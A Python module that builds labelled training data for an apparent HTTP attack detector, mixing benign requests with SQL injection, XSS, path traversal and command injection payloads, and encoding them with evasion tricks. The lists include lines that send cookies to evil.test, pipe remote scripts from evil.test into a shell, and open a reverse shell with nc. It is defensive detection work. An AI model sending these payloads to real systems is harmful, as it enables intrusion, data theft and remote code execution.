"""Training data: a seeded generator of benign and malicious requests, plus a
loader for the CSIC 2010 HTTP dataset when it is downloaded locally."""
import json
import random
from urllib.parse import quote

BENIGN_PATHS = [
    "/", "/products", "/products/12", "/search", "/login", "/register", "/cart", "/checkout",
    "/api/items", "/api/users/7", "/about", "/contact", "/blog/hello-world", "/static/app.js",
    "/images/logo.png", "/account/orders", "/help/faq",
]
BENIGN_QUERIES = [
    "", "page=2", "page=3&sort=price", "q=red+shoes", "q=laptop+bag&category=5", "id=42",
    "lang=en", "q=O%27Brien", "name=Jane+Doe", "q=select+a+size", "q=union+jack+flag",
    "q=how+to+drop+a+class", "ref=newsletter&utm_source=mail", "from=2026-01-01&to=2026-02-01",
    "q=1+%2B+1", "email=jane%40example.com", "q=rock+%26+roll", "color=blue&size=m",
]
BENIGN_BODIES = [
    "", "", "", "username=jane&password=Secret123", "email=jane%40example.com&name=Jane",
    '{"item": 4, "qty": 2}', '{"title": "Great product", "rating": 5}',
    "comment=Loved+it%21+Fast+delivery.", "address=12+Main+Street&city=Lahore",
    "q=select+all+items&page=1",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0", "Mozilla/5.0 (Macintosh) Safari/605.1",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/127.0", "curl/8.5.0",
]

SQLI = [
    "' OR '1'='1", "' OR 1=1 -- ", "admin' --", "1 UNION SELECT username,password FROM users",
    "1' UNION SELECT NULL,NULL,table_name FROM information_schema.tables-- ", "1; DROP TABLE users",
    "1 AND SLEEP(5)", "' OR SLEEP(5)#", "1' AND 1=1 -- ", "x' OR 'a'='a", "1 OR 1=1",
    "'; INSERT INTO users VALUES('a','b')--", "1 AND BENCHMARK(1000000,MD5(1))",
    "1' ORDER BY 10-- ", "\" OR \"\"=\"",
    "1 HAVING 1=1", "1' HAVING 1=1-- ", "1 GROUP BY 1 HAVING 1=1", "1 OR 1 LIKE 1",
    "1' OR 'x' LIKE 'x", "1' OR 2>1 -- ", "1 AND 2>1", "1; WAITFOR DELAY '0:0:5'--",
    "1' UNION ALL SELECT NULL,NULL-- ", "' OR 1=1#", "1; EXEC xp_cmdshell('dir')--",
    "1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64",
    "1 AND (SELECT COUNT(*) FROM users)>0", "1 OR true",
]
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "\"><script>document.location='http://evil.test/?c='+document.cookie</script>",
    "javascript:alert(document.cookie)", "<iframe src=javascript:alert(1)>",
    "<body onload=alert('x')>", "<a href=\"javascript:alert(1)\">click</a>",
    "'><img src=x onerror=prompt(1)>", "<script src=//evil.test/x.js></script>",
]
TRAVERSAL = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//etc/passwd",
    "/../../../../etc/shadow", "../../../../boot.ini", "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd", "../../../../../../proc/self/environ", "file=../../app/config.yml",
]
CMDI = [
    "; cat /etc/passwd", "| whoami", "&& id", "`id`", "$(whoami)", "; ls -la /",
    "127.0.0.1; wget http://evil.test/x.sh -O- | sh", "| nc -e /bin/sh 10.0.0.1 4444",
    "a; rm -rf /tmp/x", "|| ping -c 10 127.0.0.1", "; curl http://evil.test/s | bash",
]
ATTACKS = {"sqli": SQLI, "xss": XSS, "traversal": TRAVERSAL, "cmdi": CMDI}
PARAMS = ["id", "q", "search", "name", "file", "page", "host", "cmd", "user", "redirect"]


def _mutate(payload: str, rng: random.Random) -> str:
    choice = rng.random()
    if choice < 0.30:
        return quote(payload, safe="")
    if choice < 0.40:
        return quote(quote(payload, safe=""), safe="")
    if choice < 0.55:
        return "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in payload)
    if choice < 0.65:
        return payload.replace(" ", "/**/")
    if choice < 0.72:
        return payload.replace(" ", "+")
    return payload


def _benign(rng: random.Random) -> dict:
    method = rng.choice(["GET", "GET", "GET", "POST", "PUT"])
    return {
        "method": method,
        "path": rng.choice(BENIGN_PATHS),
        "query": rng.choice(BENIGN_QUERIES),
        "headers": {"User-Agent": rng.choice(USER_AGENTS)},
        "body": rng.choice(BENIGN_BODIES) if method != "GET" else "",
    }


def _malicious(rng: random.Random) -> tuple:
    kind = rng.choice(list(ATTACKS))
    payload = _mutate(rng.choice(ATTACKS[kind]), rng)
    param = rng.choice(PARAMS)
    request = _benign(rng)
    where = rng.choice(["query", "query", "body", "path", "header"])
    if where == "query":
        request["query"] = f"{param}={payload}"
    elif where == "body":
        request["method"] = "POST"
        request["body"] = f"{param}={payload}"
    elif where == "path":
        request["path"] = f"/{rng.choice(['files', 'download', 'view'])}/{payload}"
    else:
        request["headers"]["Referer"] = f"http://site.test/?{param}={payload}"
    return request, kind


def generate(n: int = 4000, malicious_share: float = 0.5, seed: int = 7) -> tuple:
    """Return (requests, labels, kinds); label 1 means malicious, kind is '' for benign."""
    rng = random.Random(seed)
    requests, labels, kinds = [], [], []
    for _ in range(n):
        if rng.random() < malicious_share:
            request, kind = _malicious(rng)
            requests.append(request); labels.append(1); kinds.append(kind)
        else:
            requests.append(_benign(rng)); labels.append(0); kinds.append("")
    return requests, labels, kinds


def load_csic(path: str, label: int) -> tuple:
    """Parse a CSIC 2010 text file (raw HTTP requests, blank-line separated) into requests."""
    from urllib.parse import urlsplit

    with open(path, encoding="latin-1") as fh:
        blocks = fh.read().replace("\r\n", "\n").split("\n\n")
    requests, current = [], None
    for block in blocks:
        lines = [ln for ln in block.split("\n") if ln.strip()]
        if not lines:
            continue
        first = lines[0].split(" ")
        if first[0] in {"GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"}:
            url = urlsplit(first[1])
            headers = dict(ln.split(": ", 1) for ln in lines[1:] if ": " in ln)
            current = {"method": first[0], "path": url.path, "query": url.query,
                       "headers": headers, "body": ""}
            requests.append(current)
        elif current is not None and not current["body"]:
            current["body"] = "\n".join(lines)
    return requests, [label] * len(requests)


def save_json(requests: list, labels: list, path: str) -> None:
    with open(path, "w", encoding="utf-8") as fh:
        json.dump([{"request": r, "label": y} for r, y in zip(requests, labels)], fh)
